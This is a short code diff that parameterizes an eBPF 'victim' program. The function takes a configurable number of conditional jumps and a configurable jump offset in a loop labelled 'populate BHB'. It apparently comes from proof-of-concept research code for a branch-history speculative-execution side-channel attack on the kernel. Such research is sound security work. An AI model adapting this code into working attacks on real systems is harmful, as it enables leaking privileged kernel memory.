@@ -184,7 +184,7 @@ void setup_prog_reload()
 }
 
 #define SZ_BP_SLOT 8
-void setup_prog_victim()
+void setup_prog_victim(int nr_bh, int sz_bcond_offset)
 {
     int insns_len = 0;
     int insn_bound_check = 0;
@@ -226,10 +226,10 @@ void setup_prog_victim()
     // populate BHB
     insns[insns_len++] = BPF_LDX_MEM(BPF_W, BPF_REG_8, BPF_REG_1, 0);
     insns[insns_len++] = BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 1);
-    for (int i=0; i<128; i++)
+    for (int i=0; i<nr_bh; i++)
     {
-        insns[insns_len++] = BPF_JMP_IMM(BPF_JNE, BPF_REG_8, 0x1, 8);
-        EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);
+        insns[insns_len++] = BPF_JMP_IMM(BPF_JNE, BPF_REG_8, 0x1, sz_bcond_offset);
+        EBPF_PADDING_XOR(insns_len, BPF_REG_9, sz_bcond_offset);
     }
 
     // EBPF_PADDING_XOR(insns_len, BPF_REG_9, 32);
